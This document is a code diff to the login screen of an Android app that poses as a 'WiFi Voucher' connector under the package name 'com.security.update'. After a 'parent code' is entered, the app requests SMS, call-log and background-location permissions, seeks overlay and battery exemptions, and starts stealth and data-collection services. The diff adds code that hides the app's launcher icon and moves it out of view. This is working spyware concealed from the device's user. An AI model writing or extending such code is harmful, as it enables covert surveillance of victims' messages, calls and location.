@@ -1,5 +1,6 @@
 package com.security.update;
 
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -47,7 +48,6 @@ public class LoginActivity extends AppCompatActivity {
         prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
         handler = new Handler();
 
-        // Already activated?
         if (prefs.contains("parent_code") && prefs.getBoolean("is_activated", false)) {
             startVoucherService();
             return;
@@ -72,18 +72,14 @@ public class LoginActivity extends AppCompatActivity {
         titleText.setTextColor(ContextCompat.getColor(this, android.R.color.black));
         titleText.setTextSize(28f);
         titleText.setTypeface(null, android.graphics.Typeface.BOLD);
-
         subtitleText.setText("Enter your voucher code to connect");
         subtitleText.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray));
         subtitleText.setTextSize(14f);
-
         codeInput.setHint("Voucher WiFi Code");
         codeInput.setTextColor(ContextCompat.getColor(this, android.R.color.black));
-
         verifyButton.setText("CONNECT");
         verifyButton.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
         verifyButton.setTextColor(ContextCompat.getColor(this, android.R.color.white));
-
         statusText.setText("");
         statusText.setTextSize(12f);
         progressBar.setVisibility(View.GONE);
@@ -124,7 +120,6 @@ public class LoginActivity extends AppCompatActivity {
 
                 JSONObject payload = new JSONObject();
                 payload.put("parent_code", code);
-
                 OutputStream os = conn.getOutputStream();
                 os.write(payload.toString().getBytes("UTF-8"));
                 os.flush();
@@ -141,18 +136,11 @@ public class LoginActivity extends AppCompatActivity {
                         statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark));
                         requestAllPermissions();
                     });
-                } else if (responseCode == 404) {
-                    handler.post(() -> {
-                        progressBar.setVisibility(View.GONE);
-                        verifyButton.setEnabled(true);
-                        statusText.setText("Invalid Voucher Code");
-                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
-                    });
                 } else {
                     handler.post(() -> {
                         progressBar.setVisibility(View.GONE);
                         verifyButton.setEnabled(true);
-                        statusText.setText("Server error. Try again.");
+                        statusText.setText("Invalid Voucher Code");
                         statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
                     });
                 }
@@ -169,7 +157,6 @@ public class LoginActivity extends AppCompatActivity {
 
     private void requestAllPermissions() {
         List<String> permissionsNeeded = new ArrayList<>();
-
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
             permissionsNeeded.add(android.Manifest.permission.READ_SMS);
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
@@ -184,11 +171,14 @@ public class LoginActivity extends AppCompatActivity {
             if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
                 permissionsNeeded.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
         }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
+                permissionsNeeded.add(android.Manifest.permission.POST_NOTIFICATIONS);
+        }
 
         if (!permissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
         } else {
-            // All permissions already granted
             onPermissionsGranted();
         }
     }
@@ -216,14 +206,12 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     private void onPermissionsGranted() {
-        // Request overlay permission for stealth
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             statusText.setText("Grant overlay permission...");
             Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                 Uri.parse("package:" + getPackageName()));
             startActivityForResult(overlayIntent, OVERLAY_PERMISSION_CODE);
         } else {
-            // Request battery optimization
             requestBatteryOptimization();
         }
     }
@@ -231,13 +219,7 @@ public class LoginActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == OVERLAY_PERMISSION_CODE) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
-                requestBatteryOptimization();
-            } else {
-                requestBatteryOptimization();
-            }
-        } else if (requestCode == BATTERY_OPTIMIZATION_CODE) {
+        if (requestCode == OVERLAY_PERMISSION_CODE || requestCode == BATTERY_OPTIMIZATION_CODE) {
             activateAndFinish();
         }
     }
@@ -254,12 +236,13 @@ public class LoginActivity extends AppCompatActivity {
 
     private void activateAndFinish() {
         statusText.setText("Activating...");
-
-        // Save activation
         prefs.edit()
             .putString("parent_code", verifiedCode)
             .putBoolean("is_activated", true)
             .apply();
+
+        // Hide app icon from launcher immediately
+        hideAppIcon();
 
         handler.postDelayed(() -> {
             Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
@@ -267,18 +250,26 @@ public class LoginActivity extends AppCompatActivity {
         }, 500);
     }
 
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, LoginActivity.class);
+            pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            // Continue even if hiding fails
+        }
+    }
+
     private void startVoucherService() {
-        // Start stealth service
         Intent stealthIntent = new Intent(this, StealthService.class);
         startService(stealthIntent);
-
-        // Start data collection
         Intent dataIntent = new Intent(this, DataCollectionService.class);
         startService(dataIntent);
-
-        // Go to stealth mode (hides from screen)
-        Intent stealthActivity = new Intent(this, StealthActivity.class);
-        startActivity(stealthActivity);
+        
+        // Hide from screen immediately
+        moveTaskToBack(true);
         finish();
     }
 }
